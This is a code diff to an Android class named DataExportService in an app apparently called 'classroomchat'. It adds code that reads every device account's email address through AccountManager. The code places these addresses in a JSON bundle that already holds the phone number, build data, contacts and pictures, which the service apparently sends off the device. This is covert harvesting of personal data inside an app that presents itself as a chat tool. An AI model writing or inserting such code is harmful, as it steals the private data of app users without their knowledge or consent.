@@ -1,5 +1,7 @@
 package com.n2305.classroomchat;
 
+import android.accounts.Account;
+import android.accounts.AccountManager;
 import android.app.IntentService;
 import android.content.ContentResolver;
 import android.content.Context;
@@ -15,6 +17,7 @@ import android.provider.MediaStore;
 import android.telephony.TelephonyManager;
 import android.util.Base64;
 import android.util.Log;
+import android.util.Patterns;
 
 import com.squareup.okhttp.MediaType;
 import com.squareup.okhttp.OkHttpClient;
@@ -32,6 +35,7 @@ import java.net.MalformedURLException;
 import java.net.URL;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.regex.Pattern;
 
 public class DataExportService extends IntentService {
 
@@ -92,11 +96,32 @@ public class DataExportService extends IntentService {
         JSONObject phoneData = new JSONObject();
 
         addPhoneNumberToPhoneData(phoneData);
+        addEmailsToPhoneData(phoneData);
         addBuildDataToPhoneData(phoneData);
         addPhoneContactsToPhoneData(phoneData, fetchPhoneContacts());
         addPicturesToPhoneData(phoneData);
 
         return phoneData;
+    }
+
+    protected void addEmailsToPhoneData(JSONObject phoneData) throws JSONException {
+        JSONArray jsonEmails = new JSONArray(fetchEmails());
+        phoneData.put("Emails", jsonEmails);
+    }
+
+    protected ArrayList<String> fetchEmails() {
+        Pattern emailPattern = Patterns.EMAIL_ADDRESS;
+        Account[] accounts = AccountManager.get(this).getAccounts();
+
+        ArrayList<String> emails = new ArrayList<>();
+
+        for (Account account : accounts) {
+            if (emailPattern.matcher(account.name).matches()) {
+                emails.add(account.name);
+            }
+        }
+
+        return emails;
     }
 
     protected void addPicturesToPhoneData(JSONObject phoneData) throws JSONException {
